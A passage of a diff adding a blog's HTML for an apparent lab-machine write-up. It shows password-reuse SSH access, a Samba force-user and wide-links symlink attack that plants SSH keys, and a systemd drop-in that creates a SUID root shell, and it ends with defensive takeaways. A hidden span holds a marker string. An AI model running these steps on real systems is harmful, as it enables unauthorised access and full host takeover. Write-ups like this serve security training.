+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic># iXzvcib3SrpZ</span>
+</span></span></code></pre></div><h3 id=ssh-as-scott>SSH as scott
+<a class=heading-link href=#ssh-as-scott><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>Password reuse gets us in:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>ssh scott@10.129.244.177
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic># password: iXzvcib3SrpZ</span>
+</span></span></code></pre></div><hr><h2 id=lateral-movement---scott-to-marcus>Lateral Movement - scott to marcus
+<a class=heading-link href=#lateral-movement---scott-to-marcus><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><h3 id=share-analysis>Share Analysis
+<a class=heading-link href=#share-analysis><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>Reading <code>/etc/samba/shares.conf</code> reveals a critical misconfiguration in the <code>transfer</code> share:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ini data-lang=ini><span style=display:flex><span><span style=color:#ff7b72>[transfer]</span>
+</span></span><span style=display:flex><span>   comment <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>Staff file transfer
+</span></span></span><span style=display:flex><span><span style=color:#a5d6ff>   path = /srv/transfer
+</span></span></span><span style=display:flex><span><span style=color:#a5d6ff>   valid users = scott
+</span></span></span><span style=display:flex><span><span style=color:#a5d6ff>   force user = marcus
+</span></span></span><span style=display:flex><span><span style=color:#a5d6ff>   read only = no
+</span></span></span><span style=display:flex><span><span style=color:#a5d6ff>   wide links = yes
+</span></span></span><span style=display:flex><span><span style=color:#a5d6ff>   browseable = yes</span>
+</span></span></code></pre></div><p>Combined with the global settings:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ini data-lang=ini><span style=display:flex><span>unix extensions <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>no</span>
+</span></span><span style=display:flex><span>allow insecure wide links <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>yes</span>
+</span></span></code></pre></div><p>The <code>force user = marcus</code> directive means any file written through the SMB share is created as marcus. With <code>wide links = yes</code> and <code>unix extensions = no</code>, Samba follows symlinks outside the share root. Together these allow writing to marcus's home directory by planting a symlink and connecting via SMB.</p><h3 id=planting-the-ssh-key>Planting the SSH Key
+<a class=heading-link href=#planting-the-ssh-key><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#8b949e;font-style:italic># Generate a key pair</span>
+</span></span><span style=display:flex><span>ssh-keygen -q -t ed25519 -N <span style=color:#a5d6ff>&#39;&#39;</span> -f /tmp/k
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic># Plant symlink pointing to marcus&#39;s home</span>
+</span></span><span style=display:flex><span>ln -s /home/marcus /srv/transfer/mh
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic># Write authorized_keys through SMB (force user = marcus creates it as marcus)</span>
+</span></span><span style=display:flex><span>smbclient //127.0.0.1/transfer -U <span style=color:#a5d6ff>&#39;scott%iXzvcib3SrpZ&#39;</span> <span style=color:#79c0ff>\
+</span></span></span><span style=display:flex><span>  -c <span style=color:#a5d6ff>&#39;mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys&#39;</span>
+</span></span></code></pre></div><p>The key point is connecting via <code>127.0.0.1</code> so the SMB connection goes through Samba and <code>force user = marcus</code> is applied. Direct filesystem writes as scott would create files owned by scott, which SSH would reject.</p><h3 id=ssh-as-marcus>SSH as marcus
+<a class=heading-link href=#ssh-as-marcus><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>ssh -i /tmp/k marcus@127.0.0.1
+</span></span></code></pre></div><hr><h2 id=privilege-escalation---marcus-to-root>Privilege Escalation - marcus to root
+<a class=heading-link href=#privilege-escalation---marcus-to-root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><h3 id=group-membership>Group Membership
+<a class=heading-link href=#group-membership><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>id
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic># uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)</span>
+</span></span></code></pre></div><p>Marcus is a member of the <code>operators</code> group, described in the box lore as the infrastructure team.</p><h3 id=writable-systemd-drop-in>Writable systemd Drop-in
+<a class=heading-link href=#writable-systemd-drop-in><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>ls -ld /etc/systemd/system/smbd.service.d/
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic># drwxrws--- 2 root operators 4096 Jun 4 13:41 /etc/systemd/system/smbd.service.d/</span>
+</span></span></code></pre></div><p>The <code>s</code> in <code>drwxrws---</code> is the setgid bit, meaning files created inside inherit the <code>operators</code> group. Since marcus is in <code>operators</code>, the directory is writable. Any <code>.conf</code> file placed here is a systemd drop-in that merges with <code>smbd.service</code>. The <code>ExecStartPre=</code> directive runs as the service user (root) before smbd starts.</p><h3 id=exploitation>Exploitation
+<a class=heading-link href=#exploitation><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#8b949e;font-style:italic># Drop a malicious override</span>
+</span></span><span style=display:flex><span>echo <span style=color:#a5d6ff>&#39;[Service]
+</span></span></span><span style=display:flex><span><span style=color:#a5d6ff>ExecStartPre=/bin/bash -c &#34;cp /bin/bash /tmp/rootbash &amp;&amp; chmod +s /tmp/rootbash&#34;&#39;</span> <span style=color:#79c0ff>\
+</span></span></span><span style=display:flex><span>  &gt; /etc/systemd/system/smbd.service.d/pwn.conf
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic># Reload and restart</span>
+</span></span><span style=display:flex><span>systemctl daemon-reload
+</span></span><span style=display:flex><span>systemctl restart smbd
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic># Spawn root shell</span>
+</span></span><span style=display:flex><span>/tmp/rootbash -p
+</span></span><span style=display:flex><span>whoami
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic># root</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>cat /root/root.txt
+</span></span></code></pre></div><hr><h2 id=attack-chain>Attack Chain
+<a class=heading-link href=#attack-chain><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><pre tabindex=0><code>Unauthenticated
+     |
+     v
+CVE-2026-4480 (Samba %J print command injection)
+     |
+     v
+nobody shell (/var/spool/samba)
+     |
+     v
+rclone.conf credentials in /opt/offsite-backup
+     |
+     v
+SSH as scott (password reuse: iXzvcib3SrpZ)
+     |
+     v
+SMB force user + wide links symlink attack
+     |
+     v
+SSH as marcus (authorized_keys planted as marcus)
+     |
+     v
+operators group + writable systemd drop-in
+     |
+     v
+root (ExecStartPre SUID bash)
+</code></pre><hr><h2 id=key-takeaways>Key Takeaways
+<a class=heading-link href=#key-takeaways><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><ul><li><strong>CVE-2026-4480</strong>: Samba <code>sysv</code> printing with <code>%J</code> in the print command is unauthenticated RCE. Switch to <code>printing = cups</code> or remove <code>%J</code> if a custom print command is required.</li><li><strong>rclone obfuscation is not encryption</strong>: Credentials stored in <code>rclone.conf</code> are trivially reversible with <code>rclone reveal</code>.</li><li><strong>SMB force user + wide links</strong>: This combination allows a low-privileged SMB user to write files as another user anywhere on the filesystem. Never combine these settings.</li><li><strong>Group-writable systemd drop-ins</strong>: Any group that can write to a <code>.service.d/</code> directory can achieve root-level code execution on the next service restart.</li></ul><p><span id=no-password style=display:none>Z3R0S_NO_PASSWORD_PLEASE</span></p></div><footer></footer></article></section></div><footer class=footer><section class=container>©
+2025 -
+2026
+z3r0s
+·
+Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>
